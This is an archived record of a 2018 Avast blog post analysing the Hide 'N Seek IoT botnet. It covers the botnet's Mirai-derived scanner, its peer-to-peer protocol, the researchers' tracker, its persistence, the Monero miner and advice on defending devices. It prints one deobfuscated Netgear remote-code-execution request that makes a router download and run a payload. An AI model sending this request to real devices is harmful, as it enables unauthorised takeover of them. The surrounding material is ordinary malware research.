{
    "id": "c01c60a1-a127-4e16-903a-5a551a008760",
    "created_at": "2023-01-12T15:00:31.87257Z",
    "updated_at": "2025-03-27T02:06:12.733582Z",
    "deleted_at": null,
    "sha1_hash": "16423e78eb02c48da3ef460436e6accdc982250b",
    "title": "2018-12-04 - Hide ‘N Seek botnet continues infecting devices with default credentials, building a P2P network and more.",
    "authors": "",
    "file_creation_date": "2022-05-28T19:52:36Z",
    "file_modification_date": "2022-05-28T19:52:36Z",
    "file_size": 157188,
    "plain_text": "# Hide ‘N Seek Botnet expands\n\n**blog.avast.com/hide-n-seek-botnet-continues**\n\nHide ‘N Seek botnet continues infecting devices with default credentials, building a P2P network and more.\n\n**_Written by Adolf Středa and Jan Neduchal_**\n\nIn late January 2018, a new IoT botnet was reported by Bitdefender[1]. The botnet uses several known vulnerabilities to infect new\nIoT devices and utilizes a home-brewed P2P protocol to facilitate communication across the botnet. While this botnet differs in\nmany ways, its infection vectors and techniques are very similar to Mirai’s techniques. And indeed many parts of the related\nfunctions exhibit all signs of a code reuse, as was noted in April 2018 by J. Manuel from Fortinet[3].\n\nThe Hide ‘N Seek botnet has two main functionalities. The first functionality is provided by a scanner module, whose code seems\nto be mostly borrowed from the released Mirai source code. This scanner tries to reach several random IP addresses through\npredefined ports (ports 80, 8080, 2480, 5984, and 23) and then exploits those devices that have these ports open. Used exploits\nare mostly well-known and if any specific strings are used, they are obfuscated by a simple home-brewed cipher with a hardcoded\nkey. Interestingly, due to the structure of the cipher and a small key-space, the cipher has an interesting property - the key ‘selfsynchronizes’ to the right value after several characters even if a wrong key was initially provided.\n\nGET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=wget+http://%J/%T+-O+dgn||tftp+-g+-l+dgn+r+%T+%I;chmod+777+dgn;./dgn+a%J+a%J%26%26(echo+jA3;killall+mini_httpd)||echo+ukW&curpath=/tmp&currentsetting.htm=1\nHTTP/1.1\n\nHost: %J\n\n_Deobfuscated Netgear router exploit (remote code execution)_\n\nIf exploits fail, the scanner will try to brute force credentials with the help of its hard-coded dictionary with more than 250 entries,\nmostly containing default passwords for various devices. This dictionary consists of 3 blobs of data that is obfuscated in the same\nway as other strings in the binary; the only difference is that every entry in the dictionary ends with a zero-byte that resets the\nobfuscation key.\n\nThe second functionality facilitates the communication protocol. The protocol is capable of spreading information about new peers,\ndistributing new binaries, and propagating files back from an infected device.\n\n## P2P protocol\n\n\n-----\n\nThe Hide N Seek botnet uses a home brewed protocol that runs over UDP. By default, the bot opens a random port on the victim\ndevice and adds a firewall rule to allow inbound traffic on the port. The protocol by itself does not use any kind of authentication,\nalthough some of the data transferred over it is signed, supposedly by the botnet owner.\n\nThe protocol currently supports the following commands:\n\n_<random 5- 16 bytes><uint8_t checksum>: protocol challenge, ack response expected_\n\n**_O<uint8_t checksum>:_** _acknowledgement (checksum generated from the previous message)_\n\n**_h<uint32_t current_version>: config version request_**\n\n**_H<uint32_t offered_version>: config version response_**\n\n**Y<uint8_t hash[64]><uint16_t seq><uint16_t chunk_index>: send data from file identified by**\n\n_hash from location at 256 * chunk_index (max. 256 bytes)_\n\n**_y<uint8_t hash[64]><uint16_t chunk_index><uint16_t seq>: receive data (ditto)_**\n\n**z<uint32_t ip_address><uint16_t port>: report a device to be scanned**\n\n**m<uint8_t hash[64]><uint32_t ip><uint16_t port><uint16_t id><uint8_t hops><uint8_t unknown>: send file identified by hash to**\n_ip:port; if the file is not known and hops is positive then broadcast this message to other peers with decremented hops; it is used_\nto initiate a file transfer\n\n**_^<uint8_t flag><uint16_t port><uint32_t ip_address>: response with a peer’s address/port_**\n\n**_~: request an address/port of another peer_**\n\n## Botnet tracker\n\nWe decided to track the botnet’s communication via its rather simplistic P2P protocol. The tracker consists of two parts:\n\nA downloader that tracks the updates of binaries over the botnet’s configuration file\n\nA client that tracks the botnet’s activity and tries to find new peers.\n\n[The tracker itself is available at https://threatlabs.avast.com/botnet, also it should serve as a reference aggregator for any](https://threatlabs.avast.com/botnet)\nresearch about Hide ’N Seek we publish.\n\n### File extraction\n\nEach peer has a configuration file with a list of SHA-512 hashes of other files that are available in the botnet, along with their\nrespective file lengths. To retrieve a configuration file from the peer, we need to query the peer for a file with a zero-hash. Using\nthe command “h” we may retrieve its version beforehand. Afterward, retrieving all the files available is just a matter of parsing the\nconfiguration file and querying contained hashes. Aside from Hide ‘N Seek binaries for various architectures, the configuration file\nalso contains hashes of a miner based on an open-source coinminer-opt. Note that the configuration file always contains its\nECDSA signature, effectively mitigating botnet poisoning.\n\nTo prevent peer brute forcing, we employ a simple failsafe based on a failure-rate which will stop queries if they are unsuccessful\nafter a certain number of attempts. Currently, several architectures are supported by this botnet such as x86, MIPS, and ARM.\n\n### Peer exploration\n\nAs the botnet has P2P architecture only, every piece of data necessary for analysis can be obtained through peers. To estimate\nthe botnet prevalence, we have exploited this property to recursively find new peers, along with mapping the connections between\nthem.\n\nUnfortunately, every peer selects a subset of its peer-list (usually 1 or 2 peers) that may be shared with a peer on that day.\nBecause of this, we had to expand our peer list over time. It took us a few days for the peer list to reach a total of 1k peers, and\nthen the list grew linearly adding 1-2k new peers per day. The list of currently active peers is rather small, with approximately 14%\nof them active during a 1day sliding window.\n\n\n-----\n\n## Lost N Found in the tracker\n\n### Version changes\n\nAs noted by various researchers (e.g. [2]), the Hide ‘N Seek botnet has added support for persistence. This is done by copying\nitself to /etc/init.d and also copying itself in newer versions to /etc/rc.d under a filename prefixed with S99, the higher the number\ndesignates that this file will be launched later during the startup.\n\nThe initial analysis was based on a sample 8cb5cb204eab172befcdd5c923c128dd1016c21aaab72e7b31c0359a48d1357e, when\ncompared to a more recent sample becad1b9d3b67e51404475a0a530b57fd5742f3148f23693c349035dbffddd7. In terms of\nexploits, the range was significantly expanded. The former sample contained only two HTTP request-based exploits (for TP-Link\nand Netgear devices), while the latest sample expanded attacks to cover more vendors (Cisco) and additional devices (Belkin,\nAvetech IP cameras, HomeMatic IoT device) and as well as exploits against misconfigured databases (MongoDB and CouchDB).\n\n### Miner\n\nIt was reported before [4] that the botnet is also distributing binaries which contain a cryptominer. The miner is based on an open[source CPU miner called coinminer-opt (JayDDee/cpuminer-opt). The version distributed over the botnet is configured to mine](https://github.com/JayDDee/cpuminer-opt)\n[Monero cryptocurrency under a mining pool https://moriaxmr.com. Their payment address is:](https://moriaxmr.com/)\n\n_42T2ZKueiusgZW2Tpu3NZkChLAVqvqTcvgwzfPtxsTPMDgp8morgWMkEE9oqmNsKZcDUVoCdNufs87fCGE2Y62CcJX4DUhc._\n\nWe can actually track their success on the pool’s dashboard:\n\n\nhide-n-seek-tracker-dashboard\n\n\nAs of 31.10.2018, it seems botnet owners have made almost 0.9 XMR, which would roughly translate to only $90. Since it has\nbeen running for several months now and the last payment was made at least 2 months ago, we speculate that this may have\nbeen a beta-test, possibly serving as a rough estimate of the botnet’s computing power.\n\nWe have two ways of finding this payment address. The first one is to run the sample and look at the TCP communication for\nstrings such as:\n\n\n-----\n\n_{ method : login,_\n_\"params\": {\"login\":_\n_\"42T2ZKueiusgZW2Tpu3NZkChLAVqvqTcvgwzfPtxsTPMDgp8morgWMkEE9oqmNsKZcDUVoCdNufs87fCGE2Y62CcJX4DUhc.105\",_\n_\"pass\": \"3a7\",_\n_\"agent\": \"cpuminer-opt/3.8.8\"},_\n_\"id\": 1}_\n\nHowever, this assumes that we are able to run the sample which is not trivial for some supported architectures. If we dive deeper\ninto the binary, we may notice that the address is obfuscated and could be de-obfuscated with the simple python script provided\nbelow; note that the initial BL value may vary between binaries.\n\n\nhide-n-seek-python-code\n\n\n_Python code implementing address deobfuscation yielding address_\n_42T2ZKueiusgZW2Tpu3NZkChLAVqvqTcvgwzfPtxsTPMDgp8morgWMkEE9oqmNsKZcDUVoCdNufs87fCGE2Y62CcJX4DUhc_\n\n### Ye Olde Architecture\n\nThe configuration file seems to support a plethora of various architectures. These architectures were recognized according to their\nflag (first column) in the ELF binaries.\n\nELF Flag Common architecture name Common platform\n\nEM_MIPS MIPS Routers, IoT\n\nEM_SPARC SPARC Servers\n\nEM_X86_64 x86-64 Mainstream PCs/servers\n\nEM_AARCH64 ARM 64-bit architecture Smartphones, routers, IoT\n\nEM_ARM ARM 32-bit architecture Smartphones, routers, IoT\n\nEM_PPC PowerPC Cisco routers, Apple devices till 2016, PS3\n\nEM_ARC_COMPACT ARC International ARCompact processor Cars, IoT\n\nEM_386 x86 Mainstream PCs/servers\n\nEM_SH SuperH Cars, routers (rare)\n\n\n-----\n\nWhat shall we draw from this analysis:\n\nWhile the botnet is not new, its objectives are still not clear. So far, only the Monero miner was distributed by the botnet with\na seemingly limited efficiency.\n\nThe botnet exploits devices with old publicly known vulnerabilities and default passwords.\n\nThe botnet continues to slowly evolve, adding new exploits and functionality (such as persistence).\n\nWhat can we do to protect ourselves:\n\nLimit who can access the device’s administration panel to the local network (i.e. not available via the internet).\n\nKeep your device’s firmware updated.\n\n[Change default passwords on your devices and make sure they are strong passwords.](https://blog.avast.com/strong-password-ideas)\n\n## Analyzed files (SHA-256)\n\nbecad1b9d3b67e51404475a0a530b57fd5742f3148f23693c349035dbffddd7\n\n8cb5cb204eab172befcdd5c923c128dd1016c21aaab72e7b31c0359a48d1357e\n\n6399f9463c74ee687c047e3a7e0149421de423de77ee278ce364b68d22eada00\n\n12ec8c33abae7f0b06533d96f0d820df4ac673e6ff3965a59d982623f4ddc6bb\n\nD87ff51186c4a75ba0fb802abd55a15d263187aefd489a37f505b025ddc1ee66 (miner)\n\n[1] https://labs.bitdefender.com/2018/01/new-hide-n-seek-iot-botnet-using-custom-built-peer-to-peer-communication-spotted-inthe-wild/, accessed 20.10.2018\n\n[2] [https://labs.bitdefender.com/2018/05/hide-and-seek-iot-botnet-resurfaces-with-new-tricks-persistence/, accessed 20.10.2018](https://labs.bitdefender.com/2018/05/hide-and-seek-iot-botnet-resurfaces-with-new-tricks-persistence/)\n\n[3] [https://www.fortinet.com/blog/threat-research/searching-for-the-reuse-of-mirai-code--hide--n-seek-bot.html, accessed](https://www.fortinet.com/blog/threat-research/searching-for-the-reuse-of-mirai-code--hide--n-seek-bot.html)\n20.10.2018\n\n[4] Sendroiu, A. and Diaconescu, V. (2018). Hide’N’Seek: An Adaptive Peer-to-peer IoT Botnet. In: Proceedings of the 28th Virus\nBulletin International Conference. Montreal: Virus Bulletin Ltd, pp.259-264.\n\nAvast is a global leader in cybersecurity, protecting hundreds of millions of users around the world. Protect all of your devices with\naward-winning [free antivirus. Safeguard your privacy and encrypt your online connection with](https://www.avast.com/free-antivirus-download) [SecureLine VPN.](https://www.avast.com/secureline-vpn)\n\nLearn more about products that protect your digital life at [avast.com. And get all the latest news on today's cyberthreats and how](http://avast.com/)\nto beat them at [blog.avast.com.](https://blog.avast.com/)\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2018/2018-12-04 - Hide ‘N Seek botnet continues infecting devices with default credentials, building a P2P network and more..pdf"
    ],
    "report_names": [
        "2018-12-04 - Hide ‘N Seek botnet continues infecting devices with default credentials, building a P2P network and more..pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673535631,
    "ts_updated_at": 1743041172,
    "ts_creation_date": 1653767556,
    "ts_modification_date": 1653767556,
    "files": {
        "pdf": "https://archive.orkl.eu/16423e78eb02c48da3ef460436e6accdc982250b.pdf",
        "text": "https://archive.orkl.eu/16423e78eb02c48da3ef460436e6accdc982250b.txt",
        "img": "https://archive.orkl.eu/16423e78eb02c48da3ef460436e6accdc982250b.jpg"
    }
}